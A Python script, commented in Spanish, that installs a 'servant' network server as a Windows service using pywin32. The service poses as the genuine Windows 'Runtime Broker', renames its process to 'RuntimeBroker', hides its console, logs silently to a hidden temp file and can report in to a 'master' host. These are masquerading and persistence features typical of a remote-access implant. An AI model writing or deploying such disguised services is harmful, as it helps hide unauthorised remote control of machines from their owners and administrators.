"""
Wrapper para instalar servant como servicio de Windows.

Requiere pywin32:
    pip install pywin32

Instalación:
    python install_windows_service.py install
    
Iniciar servicio:
    net start ServantService
    o
    sc start ServantService
    
Detener servicio:
    net stop ServantService
    
Desinstalar:
    python install_windows_service.py remove
"""

import sys
import os
import win32serviceutil
import win32service
import win32event
import servicemanager
import socket
import time
import threading

# Importar el servidor desde servant.py
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from servant import run_server, announce_master_loop, setup_logging, set_process_name, hide_console_window


class ServantService(win32serviceutil.ServiceFramework):
    _svc_name_ = "ServantService"
    _svc_display_name_ = "Windows Runtime Broker Service"
    _svc_description_ = "Windows system service for runtime management"
    
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self.is_running = True
        
        # Configuración (ajusta según necesites)
        self.host = "127.0.0.1"
        self.port = 65432
        self.token = "changeme-token"  # CAMBIAR ESTO
        self.master_host = None  # Configurar si se usa master
        self.master_port = None
        self.logfile = r"C:\Windows\Temp\.servant.log"

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)
        self.is_running = False

    def SvcDoRun(self):
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, '')
        )
        self.main()

    def main(self):
        # Setup logging
        setup_logging(silent=True, logfile=self.logfile)
        
        # Cambiar nombre del proceso
        set_process_name("RuntimeBroker")
        
        # Ocultar ventana si hay
        hide_console_window()
        
        # Iniciar announcer si está configurado
        if self.master_host and self.master_port:
            t = threading.Thread(
                target=announce_master_loop,
                args=(self.master_host, self.master_port, self.host, self.port, self.token),
                daemon=True
            )
            t.start()
        
        # Ejecutar servidor en un thread separado
        server_thread = threading.Thread(
            target=run_server,
            args=(self.host, self.port, self.token),
            daemon=True
        )
        server_thread.start()
        
        # Esperar señal de stop
        while self.is_running:
            if win32event.WaitForSingleObject(self.stop_event, 1000) == win32event.WAIT_OBJECT_0:
                break
        
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STOPPED,
            (self._svc_name_, '')
        )


if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(ServantService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(ServantService)
